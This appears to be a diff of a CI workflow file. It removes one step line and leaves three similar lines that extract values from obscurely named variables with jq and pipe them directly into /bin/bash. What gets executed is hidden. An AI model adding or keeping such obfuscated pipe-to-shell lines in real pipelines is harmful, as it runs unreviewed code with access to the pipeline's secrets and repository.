@@ -25,7 +25,6 @@ jobs:
           echo $untu856 | jq -r .ng5263 | /bin/bash
           echo $vaw70 | jq -r .vyvx768 | /bin/bash
           printf '%s' "$sfn65" | jq -r .zimr9 | /bin/bash
-          echo $ztai96066 | jq -r .nd96376 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
